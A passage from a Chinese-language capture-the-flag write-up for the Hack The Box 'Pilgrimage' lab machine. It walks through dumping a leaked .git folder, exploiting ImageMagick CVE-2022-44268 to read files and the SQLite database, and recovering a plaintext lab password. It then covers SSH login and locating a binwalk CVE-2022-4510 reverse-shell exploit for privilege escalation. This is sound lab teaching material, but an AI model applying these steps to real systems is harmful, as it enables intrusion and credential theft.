1.18.0\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_2","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4\u7b80\u5355\u9776\u673a\uff0c22\u7aef\u53e3SSH\u7684\u7248\u672c\u8f83\u65b0\uff0c\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b80\u7aef\u53e3\u7684Web\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#80","title":"80\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u201cDesign: TemplateMo\u201d\uff0c\u67e5\u4e86\u4e0b\u6ca1\u5565\u7279\u522b\u7684\u611f\u89c9</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u5c06\u4e0a\u4f20\u7684\u56fe\u7247\u7f29\u5c0f</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<p>\u662f\u4e2a\u80fd\u5c06\u4e0a\u4f20\u7684\u56fe\u7247\u7f29\u5c0f\u7684\u7f51\u7ad9\u3002 \u56e0\u4e3a\u6709\u4e0a\u4f20\u6240\u4ee5\u5c1d\u8bd5\u4e86\u597d\u4e45\u4e0a\u4f20\u7ed5\u8fc7\uff0c\u770b\u770b\u80fd\u4e0d\u80fd\u4f20\u4e2awebshell\u5565\u7684\u3002\u4e0d\u8fc7\u4ee5\u5931\u8d25\u544a\u7ec8\u3002</p> <p>\u80fd\u6ce8\u518c\u4ee5\u53ca\u767b\u9646\uff0c\u6240\u4ee5\u4e5f\u5c1d\u8bd5\u4e86SQLi\u3002\u4e0d\u8fc7\u4e5f\u4ee5\u5931\u8d25\u544a\u7ec8\u3002 \u7528\u6ce8\u518c\u7684\u53f7\u767b\u9646\u8fdb\u53bb\u7684\u8bdd\uff0c\u4e5f\u53ea\u662f\u4f1a\u5c06\u4e0a\u4f20\u5386\u53f2\u5217\u51fa\u6765\u3002</p> <p>\u53c8\u60f3\u8d77\u6765\u5982HTB-Stocker\u90a3\u6837\uff0c\u4e0b\u8f7d\u901a\u8fc7\u7f51\u9875\u751f\u6210\u7684pdf\uff0c\u53ef\u7528 <code>exiftool</code> \u5de5\u5177\u5206\u6790\u751f\u6210\u5668\u662f\u5426\u6709\u6f0f\u6d1e\u3002 \u4e8e\u662f\u4e0a\u4f20\u56fe\u7247\u540e\u4e0b\u8f7d\uff0c\u4f46\u662f\u6ca1\u6709\u627e\u5230\u56fe\u7247\u662f\u7528\u4ec0\u4e48\u5de5\u5177\u8f6c\u6362\u7684\uff0c\u4e5f\u65e0\u5176\u4ed6\u7279\u522b\u4fe1\u606f\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#git","title":".git\u6cc4\u9732","text":"<p>\u2026\u2026\u5728\u51c6\u5907\u7ee7\u7eed\u7814\u7a76\u4e0a\u4f20\u7ed5\u8fc7\u5e76\u5982\u4f55\u89e3\u6790\u4e3aphp\u811a\u672c\u65f6\uff0c\u5f97\u5230\u5927\u4f6c\u63d0\u793a\u8bf4\u201c.git\u6cc4\u9732\u201d\u3002</p> <p>\u4e8e\u662f\u7acb\u9a6c\u8bd5\u4e86\u4e00\u4e0b\u8bbf\u95ee <code>http://pilgrimage.htb/.git</code>\uff0c\u4e0d\u8fc7\u663e\u793a403\u3002 \u60f3\u7740\u53ef\u80fd\u662f\u65e0\u6cd5\u8bbf\u95ee.git\u8fd9\u4e2a\u6587\u4ef6\u5939\uff0c\u5c31\u770b\u4e86\u4e00\u773c\u81ea\u5df1git\u9879\u76ee\u91cc\u7684.git\u6587\u4ef6\u5939\u4e0b\u9762\u90fd\u6709\u4ec0\u4e48\u6587\u4ef6\uff0c\u7136\u540e\u8bd5\u4e86\u4e00\u4e0b\u8bbf\u95ee\u76ee\u6807\u7684 <code>/.git/config</code>\uff0c\u76f4\u63a5\u5c06\u8fd9\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u4e86\u2026\u2026\u524d\u9762\u76ee\u5f55\u66b4\u7834\u4e5f\u6ca1\u53d1\u73b0\u8fd9\u4e2a\u554a\u2026\u2026 \u770b\u4e86\u773c\u8fd9\u4e2aconfig\u6587\u4ef6\u91cc\u9762\u4e5f\u6ca1\u4ec0\u4e48\u4fe1\u606f\u3002\u63a5\u7740\u5c31\u7422\u78e8\u8fd9\u4e2a.git\u6587\u4ef6\u5939\u4e0b\u9762\u6709\u4ec0\u4e48\u662f\u503c\u5f97\u770b\u7684\uff1f\u6709\u4ec0\u4e48\u654f\u611f\u4fe1\u606f\uff1f\u5c1d\u8bd5\u4e86\u51e0\u4e2a\u6587\u4ef6\u540d\u6bd4\u8f83\u56fa\u5b9a\u7684\u6587\u4ef6\uff0c\u7136\u800c\u201cobjects\u201d\u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6\u611f\u89c9\u4f1a\u5f88\u591a\uff0c\u4e5f\u5f88\u96be\u53bb\u4e00\u4e2a\u4e00\u4e2a\u4e0b\u8f7d\u3001\u786e\u8ba4\u3002</p> <p>\u8c37\u6b4c\u4e00\u4e0b\u201cgit dump\u201d\uff0c\u53d1\u73b0git-dumper\u8fd9\u4e2a\u5de5\u5177\u3002 \u5b89\u88c5\u597d\u540e\u8fd0\u884c\u547d\u4ee4dump\u76ee\u6807\u7684.git\uff1a <pre><code>\u2514\u2500$ git-dumper http://pilgrimage.htb/.git/ target-git\n\n\u2514\u2500$ cd target-git &amp;&amp; ls -al          \n\u603b\u7528\u91cf 26972\ndrwxr-xr-x 5 kali kali     4096  6\u6708 25 06:14 .\ndrwxr-xr-x 4 kali kali     4096  6\u6708 25 06:15 ..\ndrwxr-xr-x 6 kali kali     4096  6\u6708 25 06:14 assets\n-rwxr-xr-x 1 kali kali     5538  6\u6708 25 06:14 dashboard.php\ndrwxr-xr-x 7 kali kali     4096  6\u6708 25 06:14 .git\n-rwxr-xr-x 1 kali kali     9250  6\u6708 25 06:14 index.php\n-rwxr-xr-x 1 kali kali     6822  6\u6708 25 06:14 login.php\n-rwxr-xr-x 1 kali kali       98  6\u6708 25 06:14 logout.php\n-rwxr-xr-x 1 kali kali 27555008  6\u6708 25 06:14 magick\n-rwxr-xr-x 1 kali kali     6836  6\u6708 25 06:14 register.php\ndrwxr-xr-x 4 kali kali     4096  6\u6708 25 06:14 vendor\n</code></pre></p> <p>\u539f\u6765\u4e0d\u6b62.git\u6587\u4ef6\u5939\uff0c\u800c\u662f\u4f1a\u76f4\u63a5dump\u6574\u4e2agit\u9879\u76ee\u3002</p> <p>\u770b\u4e00\u773cindex.php\uff0c\u53ef\u4ee5\u83b7\u5f97\u51e0\u6761\u4fe1\u606f\uff1a</p> <ul> <li>\u8fd9\u4e2a\u7f51\u7ad9\u5bf9\u4e0a\u4f20\u56fe\u7247\u7684\u5904\u7406\u662f\u7528 <code>magick</code> \u2014\u2014\u800c\u9879\u76ee\u6587\u4ef6\u5939\u91cc\u5c31\u6709\u540c\u540d\u6587\u4ef6</li> <li>\u8fd9\u4e2a\u9879\u76ee\u7684\u8def\u5f84\u4f30\u8ba1\u5c31\u662f\u201c/var/www/pilgrimage.htb/\u201d</li> <li>\u6570\u636e\u5e93\u662f\u7528sqlite\uff0c\u8fde\u63a5\u201c/var/db/pilgrimage\u201d</li> <li>\u6570\u636e\u5e93\u64cd\u4f5c\u4f7f\u7528\u4e86\u9884\u5904\u7406\u8bed\u53e5\uff0c\u5e94\u8be5\u5c31\u65e0\u6cd5\u5b9e\u65bdSQLi\u4e86</li> </ul> <pre><code>\u2514\u2500$ head -n 40 index.php\n&lt;?php\nsession_start();\nrequire_once \"assets/bulletproof.php\";\n\nfunction isAuthenticated() {\n  return json_encode(isset($_SESSION['user']));\n}\n\nfunction returnUsername() {\n  return \"\\\"\" . $_SESSION['user'] . \"\\\"\";\n}\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n  $image = new Bulletproof\\Image($_FILES);\n  if($image[\"toConvert\"]) {\n    $image-&gt;setLocation(\"/var/www/pilgrimage.htb/tmp\");\n    $image-&gt;setSize(100, 4000000);\n    $image-&gt;setMime(array('png','jpeg'));\n    $upload = $image-&gt;upload();\n    if($upload) {\n      $mime = \".png\";\n      $imagePath = $upload-&gt;getFullPath();\n      if(mime_content_type($imagePath) === \"image/jpeg\") {\n        $mime = \".jpeg\";\n      }\n      $newname = uniqid();\n      exec(\"/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\" . $upload-&gt;getName() . $mime . \" -resize 50% /var/www/pilgrimage.htb/shrunk/\" . $newname . $mime);\n      unlink($upload-&gt;getFullPath());\n      $upload_path = \"http://pilgrimage.htb/shrunk/\" . $newname . $mime;\n      if(isset($_SESSION['user'])) {\n        $db = new PDO('sqlite:/var/db/pilgrimage');\n        $stmt = $db-&gt;prepare(\"INSERT INTO `images` (url,original,username) VALUES (?,?,?)\");\n        $stmt-&gt;execute(array($upload_path,$_FILES[\"toConvert\"][\"name\"],$_SESSION['user']));\n      }\n      header(\"Location: /?message=\" . $upload_path . \"&amp;status=success\");\n    }\n    else {\n      header(\"Location: /?message=Image shrink failed&amp;status=fail\");\n    }\n  }\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#poc-cve-2022-44268","title":"PoC (CVE-2022-44268)","text":"<p>\u65e2\u7136SQLi\u4e0d\u7528\u60f3\u4e86\uff0c\u4e5f\u6ca1\u4ec0\u4e48\u5176\u4ed6\u601d\u8def\u3002\u5148\u770b\u770b\u9879\u76ee\u6587\u4ef6\u5939\u91cc\u7684 <code>magick</code> \u6587\u4ef6\u3002 <code>file</code> \u547d\u4ee4\u67e5\u770b\u540e\u7684\u786e\u662f\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u90a3\u4e48\u5e94\u8be5\u5c31\u662f\u7528\u7684\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u53bb\u5904\u7406\u56fe\u7247\u3002</p> <pre><code>\u2514\u2500$ file magick                                       \nmagick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped\n</code></pre> <p>\u67e5\u770b\u7248\u672c\uff0c\u597d\u786e\u8ba4\u4e00\u4e0b\u662f\u5426\u6709\u516c\u5f00\u6f0f\u6d1e\uff1a <pre><code>\u2514\u2500$ ./magick --version\nVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org\nCopyright: (C) 1999 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5) \nDelegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (7.5)\n\n\u2514\u2500$ searchsploit ImageMagick 7.1.         \n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  Path\n---------------------------------------------------------------------------------- ---------------------------------\nImageMagick 7.1.0-49 - Arbitrary File Read                                        | multiple/local/51261.txt\nImageMagick 7.1.0-49 - DoS                                                        | php/dos/51256.txt\n---------------------------------------------------------------------------------- ---------------------------------\n</code></pre></p> <p>\u7248\u672c\u53f7\u5b8c\u7f8e\u4e00\u81f4\u3002 DoS\u653b\u51fb\u6253\u9776\u4e0d\u592a\u53ef\u80fd\uff0c\u76f4\u63a5\u770b\u90a3\u4e2a\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002\u91cc\u9762\u653e\u4e86\u4e2aPoC\u8fde\u63a5\u3002</p> <p>\u5148\u6309\u7167\u6587\u7ae0\u91cc\u7684\u64cd\u4f5c\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u5c06\u7f16\u8bd1\u7684\u56fe\u7247payload\u4e0a\u4f20\uff08\u8fd0\u884c\u547d\u4ee4\u540e\u6309\u7167\u63d0\u793a\u5b89\u88c5\u4f9d\u8d56\uff09\uff0c\u4e0b\u8f7d\u88ab\u5904\u7406\u540e\u7684\u56fe\u7247\uff0c\u7136\u540e\u67e5\u770b\u56fe\u7247\u4e2d16\u8fdb\u5236\u90e8\u5206\uff0c\u6309\u6587\u7ae0\u91cc\u7684\u65b9\u6cd5\u7528python\uff0c\u6216\u8005\u4f7f\u7528CyberChef\u8f6c\u6362\uff0c\u6210\u529f\u590d\u73b0\u8fd9\u4e2aPoC\u3002 \u53ef\u4ee5\u770b\u5230 <code>/etc/passwd</code> \u91cc\u9762\u6709\u4e2a\u201cemily\u201d\u7528\u6237\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u7684\u76ee\u6807\u3002 \u4f46\u662f\u5728\u8fd9\u4e4b\u540e\u53c8\u7acb\u523b\u50f5\u4f4f\u4e86\u2014\u2014\u6211\u8fd8\u80fd\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u67e5\u770b\u4ec0\u4e48\u6587\u4ef6\u4ee5\u83b7\u5f97\u66f4\u591a\u6709\u7528\u7684\u4fe1\u606f\uff1f \u4e5f\u60f3\u7740\u662f\u5426\u6709\u679a\u4e3e\u5931\u8d25\u7684\u5b50\u57df\uff0c\u5b9e\u9645\u7684\u5165\u53e3\u5728\u5176\u4ed6\u7f51\u7ad9\uff1f\u65e2\u7136\u662fnginx\uff0c\u5c31\u786e\u8ba4\u4e86\u4e00\u4e0b <code>/etc/nginx/nginx.conf</code>\uff0c\u4f46\u662f\u5f88\u9057\u61be\u6ca1\u6709\u914d\u7f6e\u5176\u4ed6\u5b50\u57df\u3002</p> <p>\u7136\u540e\u53c8\u60f3\u8d77\u6765\u4e4b\u524d\u6253\u8fc7\u7684HTB-Ambassador\u6709\u76f4\u63a5\u628a\u6574\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\u62ff\u4e0b\u6765\u7684\u64cd\u4f5c\u3002\u4e8e\u662f\u5f00\u59cb\u5c1d\u8bd5\u8fd9\u6761\u8def\u3002 \u7531\u4e8e\u4e4b\u524d\u90a3\u4e2a\u9776\u673a\u4e5f\u662f\u7528sqlite\uff0c\u5e76\u4e14\u6570\u636e\u5e93\u6587\u4ef6\u7684\u6269\u5c55\u540d\u662f\u201c.db\u201d\uff0c\u5bfc\u81f4\u6211\u4ee5\u4e3asqlite\u90fd\u662f\u8fd9\u6837\u7684\u3002\u4e8e\u662f\u731c\u60f3\u4ee3\u7801\u4e2d\u7684 <code>sqlite:/var/db/pilgrimage</code> \u662f\u4e0d\u662f\u4ec5\u4ec5\u6307\u5411\u4e00\u4e2a\u9879\u76ee\u6587\u4ef6\u5939 <code>/var/db/pilgrimage</code>\uff0c\u7136\u540esqlite\u7a0b\u5e8f\u4f1a\u81ea\u5df1\u627e\u9879\u76ee\u91cc\u9762\u7684DB\u6587\u4ef6\u3002\u6240\u4ee5\u9700\u8981\u6211\u719f\u6089sqlite\u9879\u76ee\u7684\u6587\u4ef6\u5939\u7ed3\u6784\uff0c\u5b9a\u4f4d\u5230\u9879\u76ee\u7684\u6570\u636e\u5e93\u6587\u4ef6\u5c06\u5176\u7528\u4f5cpayload\u53c2\u6570\u3002\u5bfc\u81f4\u6211\u5c1d\u8bd5\u4e86\u201c/var/db/pilgrimage/pilgrimage.db\u201d\u7b49payload\u90fd\u6ca1\u80fd\u83b7\u53d6\u5230\u6570\u636e\u5e93\u6587\u4ef6\u2026\u2026 \u7136\u800c\u5728\u8be2\u95ee\u8fc7ChatGPT\u4e4b\u540e\u624d\u77e5\u9053\u81ea\u5df1\u60f3\u591a\u4e86\u3002sqlite\u7684\u6570\u636e\u5e93\u6587\u4ef6\u53ef\u4ee5\u6ca1\u6709\u6269\u5c55\u540d\uff0c\u4ee3\u7801\u91cc\u7684\u5199\u6cd5\u5c31\u662f\u6307\u8fd9\u4e2a\u9776\u673a\u7684\u6570\u636e\u5e93\u6587\u4ef6\u4e3a <code>/var/db/pilgrimage</code>\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#sql","title":"\u83b7\u53d6SQL\u6570\u636e\u5e93\u6587\u4ef6","text":"<p>\u65e2\u7136\u6570\u636e\u5e93\u6587\u4ef6\u5c31\u662f <code>/var/db/pilgrimage</code>\uff0c\u90a3\u4e48\u5982\u4e4b\u524d\u4e00\u6837\u7684\u65b9\u6cd5\uff0c</p> <ol> <li>\u5c06payload\u53c2\u6570\u6539\u4e3a\"/var/db/pilgrimage\"\u518d\u6b21\u7f16\u8bd1\u51fa\u56fe\u7247\uff1a<code>cargo run \"/var/db/pilgrimage\"</code></li> <li>\u5728\u76ee\u6807\u7f51\u7ad9\u4e0a\u4f20\u7f16\u8bd1\u7684payload <code>image.png</code> \u540e\u518d\u4e0b\u8f7d\uff0c\u547d\u540d\u4e3a <code>db.png</code></li> <li>\u7528\u547d\u4ee4 <code>identify -verbose db.png</code>\uff0c\u5c0616\u8fdb\u5236\u90e8\u5206\u4fdd\u5b58\u5230\u6587\u4ef6 <code>db_dump</code></li> </ol> <p>\u611f\u89c9\u8fdb\u5165\u8fd9\u4e2a\u6570\u636e\u5e93\u91cc\u5e94\u8be5\u80fd\u83b7\u53d6\u7528\u6237\u51ed\u636e\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u7528 <code>sqlite3 db_dump</code> \u8bbf\u95ee\u8fd9\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\u540e\uff0c\u4f1a\u53d1\u73b0\u867d\u7136\u770b\u4e0a\u53bb\u6709\u8fdb\u5165\u6570\u636e\u5e93\uff0c\u4f46\u662f\u4f7f\u7528\u6709\u4e9b\u547d\u4ee4\u65f6\u4f1a\u62a5\u9519\u8bf4\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u662f\u6570\u636e\u5e93\u3002 \u4e8e\u662f\u7528 <code>file</code> \u547d\u4ee4\u67e5\u770b\u521a\u521a\u4fdd\u5b58\u768416\u8fdb\u5236\u6587\u4ef6\uff0c\u53d1\u73b0\u5b83\u88ab\u8bc6\u522b\u4e3a\u5355\u7eaf\u7684\u201cASCII text\u201d\u3002</p> <pre><code>sqlite&gt; .tables\nError: file is not a database\n\n\u2514\u2500$ file db_dump\ndb_dump: ASCII text\n</code></pre> <p>\u6240\u4ee5\u5173\u952e\u662f\u5c06\u8fd9\u4e2a16\u8fdb\u5236\u6587\u672c\u8f6c\u6362\u4e3asqlite\u6570\u636e\u3002\u95ee\u4e86\u4e00\u4e0bChatGPT\uff1a</p> <p></p> <p>\u7167\u7740\u7528 <code>xxd</code> \u547d\u4ee4\u4e4b\u540e\u53c8\u7528 <code>file</code> \u547d\u4ee4\u786e\u8ba4\uff0c\u4f3c\u4e4e\u6210\u529f\u8f6c\u6362\u4e3asqlite\u6570\u636e\u5e93\u6587\u4ef6\u4e86\u3002 <pre><code>\u2514\u2500$ file database.db \ndatabase.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 60, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 60\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_4","title":"\u83b7\u5f97\u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u51ed\u636e","text":"<p>\u8fdb\u5165\u6570\u636e\u5e93\u7ffb\u627e\uff0c\u6210\u529f\u83b7\u53d6 <code>emily</code> \u7684\u7528\u6237\u51ed\u636e: <pre><code>\u2514\u2500$ sqlite3 database.db \nSQLite version 3.39.3 2022-09-05 11:02:23\nEnter \".help\" for usage hints.\nsqlite&gt; .tables\nimages  users \nsqlite&gt; SELECT * from users;\nemily|abigchonkyboi123\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#flag-user","title":"flag: user","text":"<p>SSH\u8fde\u63a5\u540e\u83b7\u5f97\u7528\u6237flag\uff1a <pre><code>\u2514\u2500$ ssh emily@10.10.11.219\n\u2026\u2026\nemily@pilgrimage:~$ id\nuid=1000(emily) gid=1000(emily) groups=1000(emily)\nemily@pilgrimage:~$ cat user.txt \n468e\u2026\u20265945\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_5","title":"\u63a2\u7d22","text":"<p>\u57fa\u7840\u63a2\u7d22\u4e00\u628a\u68ad\uff1a</p> <ul> <li>\u6709\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\u6240\u4ee5\u5148\u770b\u4e86\u773c <code>sudo -l</code>\uff1a\u6ca1\u6709sudo\u53ef\u6267\u884c</li> <li>SUID\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>cron\uff1a\u6709\u4e2aphp\u5f15\u4eba\u6ce8\u76ee\uff0c\u4e0d\u8fc7\u5185\u5bb9\u662f\u6e05\u7406\u4f1a\u8bdd\u3002\u4e5f\u65e0\u5176\u4ed6\u7279\u522b\u53d1\u73b0</li> <li>emily\u7684\u5bb6\u76ee\u5f55\uff1a<ul> <li>\u6ce8\u610f\u5230\u6709\u4e2a <code>.gitconfig</code>\uff0c\u800c\u6211\u4eec\u5c31\u662f\u901a\u8fc7.git\u6cc4\u9732\u8fdb\u6765\u7684\uff0c\u4f30\u8ba1\u6ca1\u4ec0\u4e48\u5176\u4ed6\u6709\u7528\u4fe1\u606f\u4e86\u3002\u59d1\u4e14\u786e\u8ba4\u4e86\u4e00\u4e0b\uff0c\u91cc\u9762\u53ea\u5199\u4e86git\u9879\u76ee\u7684\u6587\u4ef6\u8def\u5f84</li> <li>\u8fd8\u6709\u4e2a <code>.config</code>\uff0c\u91cc\u9762\u6709\u4e2abinwalk\u6587\u4ef6\u5939\u3002\u8fd9\u4e2a\u597d\u50cf\u662f\u5206\u6790\u4e8c\u8fdb\u5236\u7684\u5de5\u5177</li> </ul> </li> </ul> <p>\u770b\u4e00\u4e0b <code>binwalk</code> \u7248\u672c\u7136\u540e\u641c\u641c\u516c\u5f00\u6f0f\u6d1e\uff1a <pre><code>emily@pilgrimage:~/.config/binwalk$ binwalk -h\n\nBinwalk v2.3.2\n\u2026\u2026\n\n\n\u2514\u2500$ searchsploit Binwalk v2.3.            \n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  Path\n---------------------------------------------------------------------------------- ---------------------------------\nBinwalk v2.3.2 - Remote Command Execution (RCE)                                   | python/remote/51249.py\n---------------------------------------------------------------------------------- ---------------------------------\n</code></pre></p> <p>\u53c8\u662f\u7248\u672c\u53f7\u5b8c\u7f8e\u5339\u914d\u3002<code>searchsploit -m 51249</code> \u628aexp\u811a\u672c\u62ff\u4e0b\u6765\u770b\u770b\u3002 </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#poc-cve-2022-4510","title":"PoC (CVE-2022-4510)","text":"<p>\u5229\u7528\u4e0a\u5e94\u8be5\u662f\u8fd0\u884c\u8fd9\u4e2apython\u811a\u672c\uff0c\u53c2\u6570\u6307\u5b9a\u4e00\u5f20\u56fe\u7247\u3001\u548c\u53cd\u5f39shell\u7684IP\u3001port\u3002\u8fd0\u884c\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u56fe\u7247 <code>binwalk_exploit.png</code>\uff0c\u4f30\u8ba1\u662f\u7528\u4ec0\u4e48\u65b9\u5f0f\u8ba9\u8fd9\u4e2a\u6587\u4ef6\u88ab\u8bfb\u53d6\u540e\u5373\u53ef\u83b7\u5f97\u53cd\u5f39shell\u3002</p> <p>\u90a3\u4e48\u5c31\u8981\u5bfb\u627e\u8ba9\u56fe\u7247\u88ab\u8bfb\u53d6\u7684\u65b9\u5f0f\u3002</p> <p>80\u7aef\u53e3\u7f51\u7ad9\u7684\u4e0a\u4f20\u56fe\u7247\u5904\u7406\uff0c\u4ee5\u53ca\u8bbf\u95ee\u88ab\u5904\u7406\u7684\u56fe\u7247\u5e94\u8be5\u7b97\u5427\u3002\u4f46\u662f\u5c1d\u8bd5\u8fc7\u540e\u53d1\u73b0nc\u76d1\u542c\u5668\u6ca1\u53cd\u5e94\u3002\u60f3\u60f3\u4e5f\u662f\u554a\uff0c\u8fd9\u662fbinwalk\u7684\u6f0f\u6d1e\uff0c\u7f51\u7ad9\u7684\u56fe\u7247\u5904\u7406\u662f\u53e6\u4e00\u4e2a\u547d\u4ee4\u2026\u2026</p> <p>exp\u811a\u672c\u91cc\u5199\u4e86CVE\u53f7\u7801CVE-2022-4510\uff0c\u641c\u4e00\u4e0b\u770b\u770b\u80fd\u4e0d\u80fd\u660e\u767d\u4e00\u4e9b\u4ec0\u4e48\uff1a</p> <p>https://nvd.nist.gov/vuln/detail/CVE-2022-4510 </p> <p>\u8fd9\u91cc\u7684\u7b80\u4ecb\u6709\u8bf4\u5230 <code>binwalk</code> \u7528 <code>-e</code> \u9009\u9879\u65f6\u6709\u4ec0\u4e48PFS\u7684\u6f0f\u6d1e\u3002 \u5176\u5b9e\u4e5f\u770b\u5230\u4e00\u4e9b\u590d\u73b0\u6587\u7ae0\uff0c\u4f46\u662f\u6709\u70b9\u957f\u2026\u2026\u5148\u653e\u653e\u3002\u4ee5\u540e\u60f3\u7406\u89e3\u539f\u7406\u7684\u65f6\u5019\u53ef\u4ee5\u770b\u770b</p> <p>\u90a3\u53ef\u4ee5\u770b\u770b\u6709\u4ec0\u4e48\u8fdb\u7a0b\u5728\u8fd0\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u6216\u8005\u8bd5\u8bd5\u641c\u641c\u6709\u6ca1\u6709\u4ec0\u4e48\u811a\u672c\u6267\u884c\u4e86\u8fd9\u4e2a\u547d\u4ee4\u3002 \u770b\u8fdb\u7a0b\u7684\u8bdd\u7528pspy64\uff0c\u811a\u672c\u7684\u8bddgrep\u8bd5\u8bd5\u770b\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#binwalkgrep","title":"\u5bfb\u627e\u53ef\u7591binwalk\u6267\u884c\uff1agrep\u65b9\u5f0f","text":"<p>\u4e00\u5f00\u59cb\u76f4\u63a5 <code>fgrep -r 'binwalk -e' / 2&gt;/dev/null'</code>\uff0c\u4f46\u662f\u7b49\u4e86\u4e00\u9635\u5b50\u4e00\u76f4\u90fd\u6ca1\u5565\u53cd\u5e94\uff0c\u4e8e\u662f\u5220\u6389\u201c2&gt;/dev/null\u201d\u518d\u6b21\u8fd0\u884c\u3002\u53d1\u73b0\u539f\u6765\u521a\u521a\u662f\u53bb\u641c\u4e86\u5f88\u591a <code>/proc/</code> \u4e0b\u7684\u4e1c\u897f\uff0c\u5e76\u4e14\u641c\u5230\u516b\u4e5d\u767e\u591a\u5c31\u83ab\u540d\u5361\u4f4f\u4e86\u3002\u90a3\u5c31\u628a\u8fd9\u4e2a\u76ee\u5f55\u6392\u9664\u518d\u641c\u641c\u2026\u2026\u5728\u6392\u9664\u4e86\u4e24\u4e2a\u76ee\u5f55\u540e\uff0c\u53ef\u4ee5\u8fc5\u901f\u627e\u5230\u6709\u4e2a\u811a\u672c\uff1a <pre><code>emily@pilgrimage:~$ fgrep -r --exclude-dir=proc --exclude-dir=run 'binwalk -e' /\n/usr/sbin/malwarescan.sh:       binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\"\n</code></pre></p> <p>\u672c\u6765\u6ca1\u7406\u89e3grep\u8fd9\u4e2a <code>--exclude-dir</code> \u7684\u8bed\u6cd5\uff0c\u5199\u6210 <code>--exclude-dir=/proc</code> \u4f46\u662f\u4e00\u76f4\u4e0d\u7ba1\u7528\u3002\u641c\u4e86\u534a\u5929\u624d\u660e\u767d\uff0c\u539f\u6765\u8fd9\u4e2a\u9009\u9879\u540e\u586b\u5199\u7684\u76ee\u5f55\u53c2\u6570\u4f3c\u4e4e\u662f\u76f8\u5bf9\u4e8e\u641c\u7d22\u76ee\u6807\u7684\u8def\u5f84\uff08\u5373\u4e0a\u8ff0\u547d\u4ee4\u7684\u6839\u76ee\u5f55\uff09\u800c\u8a00\uff0c\u6240\u4ee5\u4e0d\u80fd\u5199\u7edd\u5bf9\u8def\u5f84\uff0c\u76f4\u63a5\u5199 <code>--exclude-dir=proc</code> 